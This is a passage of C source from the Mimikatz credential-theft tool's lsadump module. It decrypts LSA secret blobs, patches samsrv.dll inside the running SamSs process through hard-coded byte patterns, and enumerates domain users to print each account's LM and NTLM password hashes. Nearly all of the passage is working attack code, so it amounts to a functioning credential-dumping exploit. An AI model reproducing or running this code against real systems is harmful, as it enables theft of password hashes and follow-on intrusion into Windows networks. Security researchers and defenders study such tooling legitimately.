		if(CryptAcquireContext(&hContext, NULL, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		{
			if(CryptCreateHash(hContext, CALG_SHA_256, 0, 0, &hHash))
			{
				CryptHashData(hHash, pKey, szNeeded, 0);
				for(i = 0; i < 1000; i++)
					CryptHashData(hHash, hardSecretBlob->lazyiv, LAZY_NT6_IV_SIZE, 0);

				if(status = CryptGetHashParam(hHash, HP_HASHVAL, keyBlob.key, &keyBlob.keySize, 0))
				{
					for(i = 0; status && (i + FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret) < hardSecretBlobSize); i+= AES_BLOCK_SIZE)
					{
						if(status = CryptImportKey(hContext, (LPBYTE) &keyBlob, sizeof(AES_256_KEY_BLOB), 0, 0, &hKey))
						{
							szNeeded = AES_BLOCK_SIZE;
							if(!(status = CryptDecrypt(hKey, 0, FALSE, 0, &hardSecretBlob->encryptedSecret[i], &szNeeded)))
								PRINT_ERROR_AUTO(L"CryptDecrypt");
							CryptDestroyKey(hKey);
						}
						else PRINT_ERROR_AUTO(L"CryptImportKey");
					}
				}
				CryptDestroyHash(hHash);
			}
			CryptReleaseContext(hContext, 0);
		}
	}
	return status;
}

#ifdef _M_X64
BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0x49, 0x8d, 0x41, 0x20};
BYTE PATC_WIN5_NopNop[]								= {0x90, 0x90};
BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
KULL_M_PATCH_GENERIC SamSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WIN5_NopNop),		PATC_WIN5_NopNop},		{-17}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
KULL_M_PATCH_GENERIC SamSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
};
#endif
NTSTATUS kuhl_m_lsadump_samrpc(int argc, wchar_t * argv[])
{
	NTSTATUS status, enumStatus;

	LSA_OBJECT_ATTRIBUTES objectAttributes;
	LSA_HANDLE hPolicy;
	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
	PSAMPR_USER_INFO_BUFFER pUserInfoBuffer;
	SAMPR_HANDLE hSam, hDomain, hUser;
	PSAMPR_RID_ENUMERATION pEnumBuffer = NULL;
	DWORD CountRetourned, EnumerationContext = 0;
	DWORD rid, i;

	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	PKULL_M_MEMORY_HANDLE hMemory;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleSamSrv;
	HANDLE hSamSs;
	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &hLocalMemory}, aPatchMemory = {NULL, &hLocalMemory};
	KULL_M_MEMORY_SEARCH sMemory;
	PKULL_M_PATCH_GENERIC currentSamSrvReference;

	if(argc)
	{
		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, sizeof(SamSrvReferences) / sizeof(KULL_M_PATCH_GENERIC), MIMIKATZ_NT_BUILD_NUMBER))
		{
			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
			if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
			{
				if(hSamSs = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
				{
					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hSamSs, &hMemory))
					{
						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"samsrv.dll", &iModuleSamSrv))
						{
							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
							if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_samrpc, 0, NULL, NULL))
								PRINT_ERROR_AUTO(L"kull_m_patch");
						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
						kull_m_memory_close(hMemory);
					}
				} else PRINT_ERROR_AUTO(L"OpenProcess");
			} else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
		}
	}
	else
	{
		RtlZeroMemory(&objectAttributes, sizeof(LSA_OBJECT_ATTRIBUTES));
		if(NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy)))
		{
			if(NT_SUCCESS(LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID *) &pPolicyDomainInfo)))
			{
				status = SamConnect(NULL, &hSam, 0x000F003F, 0);
				if(NT_SUCCESS(status))
				{
					status = SamOpenDomain(hSam, 0x705, pPolicyDomainInfo->DomainSid, &hDomain);
					if(NT_SUCCESS(status))
					{
						kprintf(L"Domain : %wZ\n", &pPolicyDomainInfo->DomainName);
						do
						{
							enumStatus = SamEnumerateUsersInDomain(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
							if(NT_SUCCESS(enumStatus) || enumStatus == STATUS_MORE_ENTRIES)
							{
								for(i = 0; i < CountRetourned; i++)
								{
									rid = pEnumBuffer[i].RelativeId;
									kprintf(L"\nRID  : %08x (%u)\nUser : %wZ\n", rid, rid, &pEnumBuffer[i].Name);
									status = SamOpenUser(hDomain, 0x31b, rid, &hUser);
									if(NT_SUCCESS(status))
									{
										status = SamQueryInformationUser(hUser, UserInternal1Information, &pUserInfoBuffer);
										if(NT_SUCCESS(status))
										{
											kprintf(L"LM   : ");
											if(pUserInfoBuffer->Internal1.LmPasswordPresent)
												kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
											kprintf(L"\nNTLM : ");
											if(pUserInfoBuffer->Internal1.NtPasswordPresent)
												kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
											kprintf(L"\n");
											SamFreeMemory(pUserInfoBuffer);
										} else PRINT_ERROR(L"SamQueryInformationUser %08x\n", status);
										SamCloseHandle(hUser);
									} else PRINT_ERROR(L"SamOpenUser %08x\n", status);
								}
								SamFreeMemory(pEnumBuffer);
							} else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x\n", enumStatus);
						} while(enumStatus == STATUS_MORE_ENTRIES);
						SamCloseHandle(hDomain);
					} else PRINT_ERROR(L"SamOpenDomain %08x\n", status);
					SamCloseHandle(hSam);
				} else PRINT_ERROR(L"SamConnect %08x\n", status);
				LsaFreeMemory(pPolicyDomainInfo);
			}
			LsaClose(hPolicy);
		}
	}
	return status;
}
